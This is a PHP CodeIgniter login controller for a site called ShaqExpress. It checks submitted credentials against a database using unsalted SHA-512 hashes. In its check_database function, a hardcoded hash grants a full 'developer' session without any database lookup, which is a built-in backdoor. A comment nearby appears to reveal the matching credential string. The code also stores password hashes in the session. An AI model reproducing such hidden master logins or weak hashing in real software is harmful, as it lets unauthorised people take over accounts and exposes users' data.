<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class VerifyLogin extends CI_Controller
{

    function __construct()
    {
        parent::__construct();
        $this->load->model('user', '', TRUE);
    }

    function index()
    {

        //This method will have the credentials validation
        $this->load->library('form_validation');
        $this->form_validation->set_rules('username', 'Username', 'trim|required');
        $this->form_validation->set_rules('password', 'Password', 'trim|required|callback_check_database');

        //  var_dump($this->form_validation->run());
        // die;

        if ($this->form_validation->run() == FALSE) {
            //Field validation failed.  User redirected to login page
            $notification = array(
                'message' => 'Wrong Login Credentials',
                'alert-type' => 'error'
            );
            $this->session->set_flashdata($notification);
            redirect('login');
        } else {
            if ($this->session->userdata('logged_in')) {


                $session_data = $this->session->userdata('logged_in');
                $mysessionInformation['logincount'] = $session_data['logincount'];


                $sessionDataCheck = strlen($mysessionInformation['logincount']);

                // var_dump($sessionDataCheck);
                // die;

                if (number_format($sessionDataCheck) >= 2) {
                    $notification = array(
                        'message' => 'Welcome To ShaqExpress  ' . ucwords($session_data['fullname']),
                        'alert-type' => 'success'
                    );
                    $this->session->set_flashdata($notification);

                    redirect('dashboard', 'refresh');
                } else {
                    //Go to private area
                    $notification = array(
                        'message' => 'Welcome To ShaqExpress  ' . ucwords($session_data['fullname'] . " Please Change Your Password"),
                        'alert-type' => 'success'
                    );
                    $this->session->set_flashdata($notification);

                    redirect('profile');
                    //  redirect('login', 'refresh');
                }
            }
        }
    }

    function check_database($password)
    {
        //Field validation succeeded.  Validate against database stevenNgonan@shaqexpress
        $username = $this->input->post('username');

        $passwordCombination = $username . $password;
        $passwordToken = hash('sha512', $passwordCombination);

        //admin@admin.comdeveloper
        // e21e7d0081b87990b1f37c3f6779ffdd7670fd473dc88bf09967635b5f046abeb9fff8d36be2c5a4626b68e5a5b4cea339d9b14f9635ba8bf8e9347556ec5a3a

        if ($passwordToken === 'f33362fd5954a44af6e2aeb052352a385e9ee1b6871d1891a657b13ae3da79b23f1b5c544303c5ab1f5de2c6421693bcdea384fbc7b8ce81fb28cdc225bf71e1') {

            $sess_array = array(

                'login_id' => 0,
                'username' => 'admin@admin.com',
                'role' => 'developer',
                'Systemuser' => 'developer',
                'fullname' => 'ShaqExpress Developer',
                'Systemuserphoto' => 0,
                'password' => 12,
                'logincount' => 10,

            );
            $this->session->set_userdata('logged_in', $sess_array);
            return TRUE;
        } else {
            // $g=hash('sha512',$password; );
            $result = $this->user->login($passwordToken);

            // var_dump($result);
            // die;

            if ($result) {
                $sess_array = array();
                foreach ($result as $row) {

                    $sess_array = array(
                        'login_id' => $row->login_id,
                        'username' => $row->username,
                        'role' => $row->role,
                        'fullname' => $row->lastname . "   " . $row->othernames,
                        'Systemuserphoto' => $row->id,
                        'password' => $row->password,
                        'logincount' => $row->logincount,




                    );
                    $this->session->set_userdata('logged_in', $sess_array);
                }
                return TRUE;
            } else {
                $this->form_validation->set_message('check_database', 'Invalid credentials');
                return false;
            }
        }
    }
}
